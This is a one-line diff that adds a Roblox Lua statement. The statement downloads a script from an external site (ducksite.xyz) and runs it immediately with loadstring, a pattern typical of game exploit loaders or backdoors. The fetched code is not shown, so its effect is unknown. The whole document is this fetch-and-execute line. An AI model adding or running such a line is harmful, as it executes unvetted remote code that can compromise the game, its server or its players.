@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ducksite.xyz/ceri/main.lua"))()
